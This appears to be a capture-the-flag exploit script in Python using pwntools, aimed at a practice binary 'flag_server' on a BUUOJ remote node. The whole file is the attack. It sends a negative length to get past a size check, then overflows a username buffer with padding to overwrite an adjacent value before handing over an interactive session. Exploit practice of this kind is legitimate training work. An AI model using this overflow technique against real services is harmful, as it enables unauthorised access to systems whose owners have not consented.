#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

if(sys.argv[1] == 'l'):
	p = process("./flag_server")
	elf = ELF("./flag_server")
else:
	p = remote('node3.buuoj.cn',28422)
	elf = ELF("./flag_server")


sla("length: ",'-1')

offset = 0x50 - 0x10
username = ''
username = username.ljust(offset,'A')
username = username + '1'
sla("whats your username?",username)

ia()